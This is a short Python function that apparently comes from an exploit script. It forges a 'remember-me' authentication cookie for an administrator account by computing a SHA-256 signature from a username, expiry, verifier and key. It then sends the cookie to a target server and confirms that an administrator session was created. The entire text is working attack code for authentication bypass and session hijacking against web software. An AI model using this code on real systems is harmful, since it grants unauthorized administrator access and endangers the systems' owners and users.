def admin_session(http, target, verifier, key):
    http.cookies.clear()
    username = ADMIN + "@" + USER_SERVICE
    expiry = int(time.time() * 1000) + 3600000
    signature = hashlib.sha256(("%s:%s:%s:%s" % (username, expiry, verifier, key)).encode()).hexdigest()
    fields = (username, str(expiry), "SHA256", signature)
    token = base64.b64encode(":".join(urllib.parse.quote_plus(v, safe="*.-_")
                                       for v in fields).encode()).decode().rstrip("=")
    http.get(target + STATUS_PATH, headers={"Cookie": "remember-me=" + token})
    if not any(c.name == "JSESSIONID" for c in http.cookies):
        raise RuntimeError("the forged remember-me token did not create a session")
    if http.get(service_url(target)).status_code != 200:
        raise RuntimeError("the new session is not an administrator session")


